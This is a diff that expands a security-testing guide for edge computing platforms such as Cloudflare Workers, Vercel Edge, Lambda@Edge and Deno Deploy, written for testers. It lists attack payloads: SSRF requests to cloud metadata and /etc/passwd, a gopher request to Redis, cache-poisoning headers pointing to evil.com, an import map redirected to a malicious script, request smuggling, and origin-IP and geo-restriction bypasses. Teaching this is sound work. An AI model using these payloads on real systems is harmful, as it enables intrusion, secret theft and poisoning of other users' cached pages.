@@ -1,42 +1,392 @@
 <edge_computing_security_guide>
 <title>EDGE COMPUTING SECURITY TESTING</title>
 
-<critical>Edge computing security covers Cloudflare Workers, Vercel Edge Functions, Deno Deploy, and Lambda@Edge. Testing focuses on edge-specific vulnerabilities, KV store security, and geographic bypass.</critical>
+<critical>Edge computing platforms execute code at CDN edge locations worldwide, introducing unique security challenges. Edge functions run in isolated V8 environments with limited APIs but can access secrets, KV stores, and origin servers. Vulnerabilities include secret exposure, origin IP leakage, cache poisoning, geographic bypass, and SSRF through fetch APIs. Edge misconfigurations can bypass WAF rules and expose internal services.</critical>
 
 <scope>
-- Cloudflare Workers security
-- Vercel Edge Functions
-- Deno Deploy testing
-- AWS Lambda@Edge
-- Edge-specific vulnerabilities
-- KV store security
-- Geographic bypass
+- Cloudflare Workers and Workers KV security
+- Vercel Edge Functions and Edge Middleware
+- AWS Lambda@Edge and CloudFront Functions
+- Deno Deploy security testing
+- Fastly Compute@Edge
+- Edge KV/Durable Objects security
+- Origin IP exposure and bypass
+- Edge cache poisoning attacks
+- Geographic restriction bypass
+- Edge-side includes (ESI) injection
+- Secret/environment variable exposure
+- SSRF via edge fetch APIs
 </scope>
 
-<cloudflare_workers>
+<methodology>
+1. Identify edge function endpoints and trigger conditions.
+2. Enumerate environment variables and bound KV namespaces.
+3. Test for origin server exposure through edge misconfigurations.
+4. Analyze fetch/request handling for SSRF vulnerabilities.
+5. Test cache behavior for poisoning opportunities.
+6. Attempt geographic and rate limit bypasses.
+7. Check for secret leakage in responses and errors.
+8. Test authentication/authorization at edge vs origin.
+</methodology>
+
+<testing_techniques>
+<cloudflare_workers_security>
 {% raw %}
-# Workers security:
-# Check for exposed secrets:
-env.API_KEY
+# Cloudflare Workers Security Testing
 
-# Test KV store access:
-await NAMESPACE.get('key')
+# 1. Secret/Environment Variable Exposure
+# Workers bind secrets via wrangler.toml or dashboard
+# Test for leaked secrets in responses or errors
 
-# SSRF via fetch():
-await fetch(userInput)
+# Common secret naming patterns to probe:
+# API_KEY, SECRET_KEY, DATABASE_URL, AUTH_TOKEN
+# STRIPE_KEY, SENDGRID_KEY, JWT_SECRET
+
+# Force error to leak env info
+GET /api/endpoint?param=__proto__
+GET /api/endpoint?callback=<script>
+
+# Check if secrets appear in response headers
+curl -v https://target.workers.dev/api/debug
+
+# 2. Workers KV Store Testing
+# KV operations that might be exploitable:
+await KV_NAMESPACE.get(userInput)           // Key enumeration
+await KV_NAMESPACE.put(userInput, data)     // Data injection
+await KV_NAMESPACE.list({ prefix: userInput }) // Prefix scanning
+
+# Test for KV injection:
+GET /api/data?key=../admin/credentials
+GET /api/data?key=*
+GET /api/data?key=../../sensitive
+
+# 3. Durable Objects Testing
+# Durable Objects have persistent state per ID
+# Test for IDOR via object ID manipulation
+GET /api/room/123      # Your room
+GET /api/room/1        # Admin room?
+GET /api/room/admin
+
+# 4. SSRF via fetch()
+# Workers use fetch() for external requests
+# Test if user input reaches fetch URL
+
+# Direct SSRF:
+GET /proxy?url=http://169.254.169.254/latest/meta-data/
+GET /proxy?url=http://localhost:8080/admin
+
+# Protocol smuggling:
+GET /proxy?url=file:///etc/passwd
+GET /proxy?url=gopher://internal:6379/_*1%0d%0a$4%0d%0aINFO%0d%0a
+
+# 5. Origin Exposure
+# Find origin IP behind Cloudflare
+# Check for routes that bypass Workers
+
+# Common bypass patterns:
+curl -H "Host: target.com" http://direct-origin-ip.com/
+curl https://target.com/cdn-cgi/trace  # CF diagnostic
+curl https://target.com/.well-known/   # Often not through Workers
 {% endraw %}
-</cloudflare_workers>
+</cloudflare_workers_security>
 
-<edge_bypass>
+<vercel_edge_testing>
 {% raw %}
-# Geographic restrictions bypass:
-# Use VPN/proxy in allowed region
+# Vercel Edge Functions & Middleware Testing
 
-# Edge cache bypass:
-# Cache-Control: no-cache
-# Pragma: no-cache
+# 1. Edge Middleware Bypass
+# Middleware runs before page/API routes
+# Test paths that might skip middleware
+
+# Common bypass attempts:
+GET /_next/static/          # Static assets bypass
+GET /_next/image?url=       # Image optimization
+GET /api/_internal/         # Internal routes
+GET /favicon.ico            # Static files
+GET /%2e%2e/admin           # Path traversal encoding
+
+# 2. Environment Variable Leakage
+# Vercel exposes env vars prefixed with NEXT_PUBLIC_
+# Check for accidental exposure of server-side vars
+
+# Force errors that might leak env:
+GET /api/endpoint?__nextDataReq=1&undefined
+POST /api/endpoint Content-Type: invalid
+
+# 3. Edge Config Testing
+# Vercel Edge Config is a global KV store
+import { get } from '@vercel/edge-config';
+const value = await get(userInput);  // Key injection
+
+# Test edge config key enumeration:
+GET /api/config?key=feature-flags
+GET /api/config?key=api-keys
+GET /api/config?key=secrets
+
+# 4. ISR/SSG Cache Poisoning
+# Test cache key manipulation
+GET /page?__nextLocale=en     # Locale poisoning
+GET /page HTTP/1.1            # HTTP version cache key
+Host: target.com
+X-Forwarded-Host: evil.com    # Host header poisoning
+
+# 5. Serverless Function Cold Start Info Leak
+# Cold starts may log more verbose errors
+# Rapid requests then wait 5+ minutes, request again
 {% endraw %}
-</edge_bypass>
+</vercel_edge_testing>
 
-<remember>Edge security: Check Workers for secret exposure, test KV store permissions, validate fetch() SSRF protection, attempt geographic bypass.</remember>
+<lambda_edge_testing>
+{% raw %}
+# AWS Lambda@Edge & CloudFront Functions Testing
+
+# 1. CloudFront Function Limitations
+# CloudFront Functions have restricted APIs
+# Limited to viewer request/response events
+# Cannot make network calls - focus on header manipulation
+
+# Test header injection:
+GET / HTTP/1.1
+Host: target.com
+X-Forwarded-For: 127.0.0.1, attacker.com
+X-Original-URL: /admin
+
+# 2. Lambda@Edge SSRF
+# Lambda@Edge can make network calls
+# Test if origin request is manipulable
+
+# Origin header manipulation:
+GET /api/proxy
+X-Custom-Origin: http://169.254.169.254/
+
+# 3. Origin Failover Exploitation
+# CloudFront origin groups have primary/failover
+# Force failover to reach secondary origin
+
+# Trigger 5xx from primary:
+GET /api/endpoint HTTP/1.1
+Host: target.com
+Content-Length: 99999999999
+
+# 4. Signed URL/Cookie Bypass
+# CloudFront can use signed URLs/cookies
+# Test for signature validation issues
+
+# Expired signature (check if validated):
+GET /protected/file?Expires=1&Signature=x&Key-Pair-Id=K123
+
+# Parameter pollution:
+GET /protected/file?Expires=future&Expires=past
+
+# 5. Cache Behavior Testing
+# Different cache behaviors per path pattern
+GET /api/*           # API behavior
+GET /static/*        # Static behavior
+GET /*.jpg           # Image behavior
+
+# Test for behavior that skips edge function
+{% endraw %}
+</lambda_edge_testing>
+
+<origin_exposure_techniques>
+{% raw %}
+# Finding Origin IP Behind Edge/CDN
+
+# 1. Historical DNS Records
+# Check DNS history for pre-CDN IPs
+dig +short target.com @8.8.8.8
+# Use SecurityTrails, ViewDNS, DNSDumpster
+
+# 2. SSL Certificate Search
+# Origin may have cert with IP in SAN
+# Search crt.sh, Censys for target's certs
+
+# 3. Subdomain Enumeration
+# Subdomains may point directly to origin
+# dev.target.com, staging.target.com, api.target.com
+
+# 4. Email Headers
+# Send email to trigger response, check headers
+# Received: from origin-server.target.com [ORIGIN_IP]
+
+# 5. Web Application Leakage
+# Error pages, debug endpoints may leak origin
+GET /debug
+GET /server-status
+GET /phpinfo.php
+
+# 6. Out-of-Band Techniques
+# Trigger callback to attacker server
+# SSRF, XXE, or webhook that bypasses edge
+
+# 7. Direct IP Access Test
+# Once origin IP found, test direct access:
+curl -H "Host: target.com" http://ORIGIN_IP/
+curl --resolve target.com:443:ORIGIN_IP https://target.com/
+
+# 8. IPv6 Bypass
+# CDN may only proxy IPv4
+dig AAAA target.com
+curl -6 https://target.com/
+{% endraw %}
+</origin_exposure_techniques>
+
+<cache_poisoning_at_edge>
+{% raw %}
+# Edge Cache Poisoning Attacks
+
+# 1. Unkeyed Header Injection
+# Headers not in cache key but reflected in response
+GET /page HTTP/1.1
+Host: target.com
+X-Forwarded-Host: evil.com
+
+# If response includes: <base href="https://evil.com/">
+# And response is cached, all users get poisoned
+
+# 2. Unkeyed Query Parameters
+# Some params excluded from cache key
+GET /page?utm_source=x&cb=<script>alert(1)</script>
+# cb= might not be in cache key but reflected
+
+# 3. Fat GET Requests
+# Body in GET might be processed but not keyed
+GET /api/data HTTP/1.1
+Host: target.com
+Content-Length: 20
+
+{"admin": true}
+
+# 4. HTTP Request Smuggling at Edge
+# Edge and origin may parse differently
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 13
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: target.com
+
+# 5. Vary Header Manipulation
+# Incorrect Vary header = cache poisoning
+GET /api/data HTTP/1.1
+Host: target.com
+Accept-Language: en"><script>alert(1)</script>
+
+# 6. Cache Key Normalization Issues
+# URL encoding differences
+GET /page%2f..%2fadmin  # May normalize to /admin
+GET /page/./admin       # Path normalization
+{% endraw %}
+</cache_poisoning_at_edge>
+
+<geographic_bypass>
+{% raw %}
+# Geographic Restriction Bypass Techniques
+
+# 1. VPN/Proxy in Allowed Region
+# Use commercial VPN with servers in target region
+
+# 2. Cloud Function Proxy
+# Deploy function in allowed region as proxy
+# AWS Lambda in eu-west-1 to access EU-only content
+
+# 3. Header Spoofing (if trusted)
+# Some edge configs trust these headers:
+CF-IPCountry: US
+X-Country-Code: US
+CloudFront-Viewer-Country: US
+X-Geo-Country: US
+
+# 4. IPv6 Geographic Database Gap
+# IPv6 geolocation less accurate
+# May bypass country restrictions
+
+# 5. Residential Proxy Networks
+# Use residential IPs in target country
+# Bypass IP-based geo restrictions
+
+# 6. Edge Location Manipulation
+# Some CDNs allow edge location preference
+# Force routing through specific POP
+{% endraw %}
+</geographic_bypass>
+
+<deno_deploy_testing>
+{% raw %}
+# Deno Deploy Security Testing
+
+# 1. Permission Model Testing
+# Deno has permission system but Deploy runs with --allow-all
+# Focus on fetch() SSRF and env access
+
+# 2. Environment Variable Access
+Deno.env.get("SECRET_KEY")  // Check for exposed secrets
+
+# 3. SSRF via fetch
+const resp = await fetch(userInput);  // Direct SSRF
+const resp = await fetch(`https://api.internal.com/${userInput}`);  // Path injection
+
+# 4. Import Map Poisoning
+# If import maps are dynamic, test for poisoning
+{
+  "imports": {
+    "lodash": "https://evil.com/malicious.js"
+  }
+}
+
+# 5. KV Store Testing (Deno KV)
+const kv = await Deno.openKv();
+await kv.get([userInput]);  // Key injection
+{% endraw %}
+</deno_deploy_testing>
+</testing_techniques>
+
+<validation>
+1. Confirm origin IP by accessing directly and comparing responses.
+2. Verify cache poisoning by checking if payload persists across sessions.
+3. Test SSRF by using out-of-band callbacks (webhook.site, Burp Collaborator).
+4. Validate geographic bypass by confirming access from restricted region.
+5. Confirm secret exposure by using leaked values in API calls.
+6. Verify KV injection by observing unauthorized data access.
+7. Test edge middleware bypass by confirming skipped authentication.
+</validation>
+
+<false_positives>
+- Origin IP found but firewall blocks non-CDN traffic
+- Cache poisoning works in testing but TTL too short for impact
+- Secret appears in error but is a dummy/example value
+- Geographic bypass works but content is the same globally
+- KV key accessible but contains only public data
+- Edge function bypassed but origin has same security controls
+- SSRF possible but internal services not reachable
+</false_positives>
+
+<impact>
+- Direct origin access bypassing WAF and DDoS protection
+- Web cache poisoning affecting all users
+- Secret/credential exposure enabling further attacks
+- Geographic restriction bypass for content/feature access
+- SSRF reaching internal services from edge locations
+- Data exfiltration via KV store access
+- Authentication bypass through middleware circumvention
+- Cache deception leading to sensitive data exposure
+</impact>
+
+<pro_tips>
+1. Edge functions often have different auth than origin - test both paths.
+2. Check /_next/, /cdn-cgi/, /_vercel/ paths for edge diagnostic info.
+3. Error pages at edge may leak more info than origin errors.
+4. Cold start latency differences can reveal edge vs origin routing.
+5. Edge KV stores often have weaker access controls than databases.
+6. Test with multiple geographic locations - security may vary by region.
+7. Cache keys are often not what you expect - test with Pragma/Cache-Control.
+8. Origin IPs often appear in email headers and webhook callbacks.
+9. Edge functions share some V8 context - look for isolation bypasses.
+10. Signed URL expiration is sometimes only checked at cache miss.
+</pro_tips>
+
+<remember>Edge computing shifts security controls to globally distributed points of presence. Origin exposure bypasses all edge protections. Cache poisoning at edge affects users worldwide. Edge functions have unique constraints (V8 isolates, limited APIs) but also unique vulnerabilities (KV injection, origin leakage). Always test both edge and origin security independently.</remember>
 </edge_computing_security_guide>
